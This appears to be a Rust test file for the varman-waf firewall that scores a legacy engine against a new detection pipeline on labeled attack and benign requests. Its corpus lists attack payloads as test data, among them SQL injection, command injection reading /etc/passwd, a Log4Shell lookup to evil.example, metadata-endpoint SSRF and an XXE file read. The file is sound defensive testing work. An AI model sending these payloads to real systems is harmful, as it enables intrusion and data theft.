//! Standing shadow-comparison report: the legacy engine versus the Varman
//! pipeline over a labeled corpus.
//!
//! The report answers the rollout question "what does the new engine do
//! differently?" with numbers: agreement classes, attack coverage on both
//! sides, benign false positives on both sides, and every disagreement
//! listed by name. It runs the *same* detector list the edge runs
//! (`varman_waf::pipeline::default_detectors`), so it cannot drift from
//! production.
//!
//! Run with:
//!
//! ```text
//! cargo test -p varman-waf --test shadow_report -- --nocapture
//! ```
//!
//! The report is written to `docs/shadow-report.md`; the assertions ratchet
//! the pipeline's attack coverage and the benign false-positive count so a
//! regression fails CI instead of silently degrading the comparison.

use std::fmt::Write as _;

use varman_waf::canonical::{Canonicalizer, RequestParts};
use varman_waf::engine::{RequestData, WafEngine, WafEngineConfig};
use varman_waf::pipeline::default_detectors;
use varman_waf::pipeline::SecurityPipeline;
use varman_waf::WafAction;

/// One labeled corpus case.
struct Case {
    name: &'static str,
    category: &'static str,
    attack: bool,
    method: &'static str,
    target: &'static str,
    headers: &'static [(&'static str, &'static str)],
    body: Option<&'static str>,
}

const fn attack(
    name: &'static str,
    category: &'static str,
    target: &'static str,
) -> Case {
    Case {
        name,
        category,
        attack: true,
        method: "GET",
        target,
        headers: &[],
        body: None,
    }
}

const fn benign(name: &'static str, target: &'static str) -> Case {
    Case {
        name,
        category: "benign",
        attack: false,
        method: "GET",
        target,
        headers: &[],
        body: None,
    }
}

fn corpus() -> Vec<Case> {
    vec![
        attack("sql_union", "sql_injection", "/?id=1 UNION SELECT password FROM users"),
        attack("sql_tautology", "sql_injection", "/?id=1' OR '1'='1"),
        attack("sql_stacked", "sql_injection", "/?id=1; DROP TABLE users"),
        attack("sql_ast_dml", "sql_injection", "/?q=DELETE FROM sessions WHERE user_id = 1"),
        attack("xss_script", "xss", "/?q=<script>alert(1)</script>"),
        attack("command_subshell", "command_injection", "/?cmd=;cat /etc/passwd"),
        attack("path_traversal", "path_traversal", "/?file=../../etc/passwd"),
        attack("path_raw", "path_traversal", "/%2e%2e/%2e%2e/etc/passwd"),
        attack("log4shell", "log4shell", "/?x=${jndi:ldap://evil.example/a}"),
        attack("ssrf_metadata", "ssrf", "/?url=http://169.254.169.254/latest/meta-data/"),
        attack("crlf_header", "crlf_injection", "/?next=%0d%0aSet-Cookie:admin=1"),
        attack("ssti_math", "ssti", "/?t={{7*7}}"),
        attack("nosql_operator", "nosql_injection", "/?user[$ne]=1"),
        attack("ldap_filter", "ldap_injection", "/?u=*)(uid=*))(|(uid=*"),
        attack("prototype_pollution", "prototype_pollution", "/?__proto__[admin]=true"),
        attack("graphql_introspection", "api_abuse", "/graphql?query={__schema{types{name}}}"),
        attack("jwt_alg_none", "jwt_abuse", "/?token=eyJhbGciOiJub25lIn0.e30."),
        attack("scanner_ua", "threat_intelligence", "/"),
        attack("deserialization_java", "deserialization", "/?d=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"),
        attack("xxe_entity", "xxe", "/"),
        benign("root", "/"),
        benign("search_text", "/?q=blue shoes"),
        benign("sql_docs", "/?q=SELECT id, name FROM users WHERE active = 1 ORDER BY name;"),
        benign("api_path", "/api/v1/items/42"),
        benign("date", "/?date=2026-10-08"),
        benign("email", "/?email=user@example.com"),
        benign("math", "/?expr=2+2*2"),
        benign("base64", "/?data=SGVsbG8gV29ybGQ="),
        benign("unicode", "/?q=%E1%9E%9F%E1%9E%BD%E1%9E%9F%E1%9F%92%E1%9E%8F%E1%9E%B8"),
        benign("long_prose", "/?q=the quick brown fox jumps over the lazy dog and keeps running through the field"),
    ]
}

/// Extra headers/body cases are built here to keep the table above readable.
fn special_cases() -> Vec<Case> {
    vec![
        Case {
            name: "xxe_entity",
            category: "xxe",
            attack: true,
            method: "POST",
            target: "/xml",
            headers: &[("content-type", "application/xml")],
            body: Some(
                r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#,
            ),
        },
        Case {
            name: "scanner_ua",
            category: "threat_intelligence",
            attack: true,
            method: "GET",
            target: "/",
            headers: &[("user-agent", "sqlmap/1.7#stable")],
            body: None,
        },
        Case {
            name: "jwt_alg_none",
            category: "jwt_abuse",
            attack: true,
            method: "GET",
            target: "/",
            headers: &[(
                "authorization",
                "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.",
            )],
            body: None,
        },
        Case {
            name: "websocket_cswsh",
            category: "websocket",
            attack: true,
            method: "GET",
            target: "/ws",
            headers: &[
                ("upgrade", "websocket"),
                ("connection", "Upgrade"),
                ("sec-websocket-key", "dGhlIHNhbXBsZSBub25jZQ=="),
                ("sec-websocket-version", "13"),
                ("origin", "https://evil.example"),
            ],
            body: None,
        },
        Case {
            name: "json_benign",
            category: "benign",
            attack: false,
            method: "POST",
            target: "/api/items",
            headers: &[("content-type", "application/json")],
            body: Some(r#"{"name":"widget","price":9.5,"tags":["new"]}"#),
        },
        Case {
            name: "graphql_benign",
            category: "benign",
            attack: false,
            method: "POST",
            target: "/graphql",
            headers: &[("content-type", "application/json")],
            body: Some(r#"{"query":"{ items(first: 10) { id name } }"}"#),
        },
    ]
}

fn ranked(action: WafAction) -> u8 {
    match action {
        WafAction::Pass => 0,
        WafAction::Monitor => 1,
        WafAction::Challenge => 2,
        WafAction::Block => 3,
    }
}

fn legacy_verdict(engine: &WafEngine, case: &Case) -> WafAction {
    let (path, query) = case
        .target
        .split_once('?')
        .map_or((case.target, ""), |(path, query)| (path, query));
    let mut request = RequestData::new(case.method, path);
    request.query = query.to_string();
    request.headers =
        std::iter::once(("host".to_string(), "example.com".to_string()))
            .chain(
                case.headers
                    .iter()
                    .map(|(name, value)| (name.to_string(), value.to_string())),
            )
            .collect();
    request.body = case.body.map(|body| body.as_bytes().to_vec());
    request.client_ip = "203.0.113.9".to_string();
    request.scheme = "https".to_string();
    request.protocol = "HTTP/1.1".to_string();
    engine.inspect(&request).action
}

fn pipeline_verdict(
    pipeline: &SecurityPipeline,
    canonicalizer: &Canonicalizer,
    case: &Case,
) -> (WafAction, Vec<String>) {
    let mut parts = RequestParts::new(case.method, "example.com", case.target);
    for (name, value) in case.headers {
        parts = parts.with_header(*name, *value);
    }
    if let Some(body) = case.body {
        parts = parts.with_body(body.as_bytes().to_vec());
    }
    let canonical = canonicalizer.canonicalize(parts);
    let verdict = pipeline.inspect(&canonical);
    let findings = verdict
        .findings
        .iter()
        .filter(|finding| {
            matches!(
                finding.action_hint,
                varman_waf::pipeline::Action::Monitor
                    | varman_waf::pipeline::Action::Block
                    | varman_waf::pipeline::Action::Challenge
            )
        })
        .map(|finding| finding.rule_id.to_string())
        .collect();
    (verdict.to_waf_verdict().action, findings)
}

#[test]
fn shadow_comparison_report() {
    let engine = WafEngine::new(&WafEngineConfig::default());
    let pipeline = SecurityPipeline::new(default_detectors());
    let canonicalizer = Canonicalizer::default();

    let mut cases = corpus();
    // The table above includes placeholder rows for the special cases; drop
    // them so the richer definition (headers/body) wins.
    let specials = special_cases();
    let special_names: std::collections::BTreeSet<&str> =
        specials.iter().map(|case| case.name).collect();
    cases.retain(|case| !special_names.contains(case.name));
    cases.extend(specials);

    let mut rows: Vec<(
        String,
        String,
        bool,
        WafAction,
        WafAction,
        Vec<String>,
    )> = Vec::new();
    let (mut agree, mut stricter, mut weaker) = (0u32, 0u32, 0u32);
    let (mut attacks, mut attacks_legacy, mut attacks_pipeline) =
        (0u32, 0u32, 0u32);
    let (mut benign, mut benign_legacy_fp, mut benign_pipeline_fp) =
        (0u32, 0u32, 0u32);

    for case in &cases {
        let legacy = legacy_verdict(&engine, case);
        let (varman, findings) =
            pipeline_verdict(&pipeline, &canonicalizer, case);
        let (legacy_rank, varman_rank) = (ranked(legacy), ranked(varman));
        if legacy_rank == varman_rank {
            agree += 1;
        } else if varman_rank > legacy_rank {
            stricter += 1;
        } else {
            weaker += 1;
        }
        if case.attack {
            attacks += 1;
            attacks_legacy += u32::from(legacy_rank >= 1);
            attacks_pipeline += u32::from(varman_rank >= 1);
        } else {
            benign += 1;
            benign_legacy_fp += u32::from(legacy_rank >= 1);
            benign_pipeline_fp += u32::from(varman_rank >= 1);
        }
        rows.push((
            case.name.to_string(),
            case.category.to_string(),
            case.attack,
            legacy,
            varman,
            findings,
        ));
    }

    let mut report = String::new();
    let _ = writeln!(report, "# Shadow-comparison report");
    let _ = writeln!(report);
    let _ = writeln!(
        report,
        "Generated by `varman-waf/tests/shadow_report.rs` \
         (`cargo test -p varman-waf --test shadow_report`). The legacy engine \
         runs `WafEngineConfig::default()`; the pipeline runs \
         `varman_waf::pipeline::default_detectors()` - the same list the edge \
         runs."
    );
    let _ = writeln!(report);
    let _ = writeln!(report, "## Summary");
    let _ = writeln!(report);
    let _ = writeln!(report, "| Metric | Value |");
    let _ = writeln!(report, "|---|---:|");
    let _ = writeln!(report, "| Cases | {} |", rows.len());
    let _ = writeln!(report, "| Agree (same strength) | {agree} |");
    let _ = writeln!(report, "| Pipeline stricter | {stricter} |");
    let _ = writeln!(report, "| Pipeline weaker | {weaker} |");
    let _ = writeln!(
        report,
        "| Attack cases detected by legacy | {attacks_legacy}/{attacks} |"
    );
    let _ = writeln!(
        report,
        "| Attack cases detected by pipeline | {attacks_pipeline}/{attacks} |"
    );
    let _ = writeln!(
        report,
        "| Benign false positives (legacy) | {benign_legacy_fp}/{benign} |"
    );
    let _ = writeln!(
        report,
        "| Benign false positives (pipeline) | {benign_pipeline_fp}/{benign} |"
    );
    let _ = writeln!(report);
    let _ = writeln!(report, "## Cases");
    let _ = writeln!(report);
    let _ = writeln!(
        report,
        "| Case | Category | Kind | Legacy | Pipeline | Pipeline findings |"
    );
    let _ = writeln!(report, "|---|---|---|---|---|---|");
    for (name, category, is_attack, legacy, varman, findings) in &rows {
        let _ = writeln!(
            report,
            "| {name} | {category} | {} | {} | {} | {} |",
            if *is_attack { "attack" } else { "benign" },
            action_name(*legacy),
            action_name(*varman),
            if findings.is_empty() {
                "-".to_string()
            } else {
                findings.join(", ")
            }
        );
    }
    let _ = writeln!(report);
    let _ = writeln!(report, "## Disagreements");
    let _ = writeln!(report);
    let mut any = false;
    for (name, category, is_attack, legacy, varman, _findings) in &rows {
        if ranked(*legacy) == ranked(*varman) {
            continue;
        }
        any = true;
        let _ = writeln!(
            report,
            "- `{name}` ({category}, {}): legacy {} vs pipeline {}",
            if *is_attack { "attack" } else { "benign" },
            action_name(*legacy),
            action_name(*varman)
        );
    }
    if !any {
        let _ = writeln!(report, "None.");
    }

    println!("{report}");
    let path = std::path::Path::new("../docs/shadow-report.md");
    std::fs::write(path, &report)
        .unwrap_or_else(|error| panic!("cannot write {path:?}: {error}"));

    // Ratchets: the pipeline must cover the attack corpus and stay clean on
    // the benign corpus. Update deliberately, with the report as evidence.
    assert!(
        attacks_pipeline >= attacks - 2,
        "pipeline attack coverage regressed: {attacks_pipeline}/{attacks}\n{report}"
    );
    assert_eq!(
        benign_pipeline_fp, 0,
        "pipeline flagged benign traffic\n{report}"
    );
    assert!(
        benign_legacy_fp <= 2,
        "legacy false-positive budget exceeded: {benign_legacy_fp}/{benign}\n{report}"
    );
}

fn action_name(action: WafAction) -> &'static str {
    match action {
        WafAction::Pass => "pass",
        WafAction::Monitor => "monitor",
        WafAction::Challenge => "challenge",
        WafAction::Block => "block",
    }
}
